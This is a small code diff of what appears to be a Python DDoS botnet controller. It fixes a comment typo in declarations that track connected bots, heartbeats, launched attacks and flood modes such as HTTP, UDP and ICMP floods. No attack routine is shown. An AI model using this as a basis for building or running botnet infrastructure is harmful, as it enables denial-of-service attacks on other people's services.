@@ -11,9 +11,10 @@ from os import path as os_path
 from shutil import rmtree, copy
 from random import randint
 from winsound import Beep
+
 datasock_list = {}  # dict of bots  {Number(int):socket}
 last_Heartbeat = {}  # recored the time a bot send its heartbeat message
-ddos_attack_list = [] # recored ddos attack launched
+ddos_attack_list = [] # record ddos attack launched
 mode_list = ['httpGETflood', 'httpPOSTflood', 'UDPflood', 'ICMPflood', 'Mix'] # attack_method
 # printed with color
 def print_error(str : str):
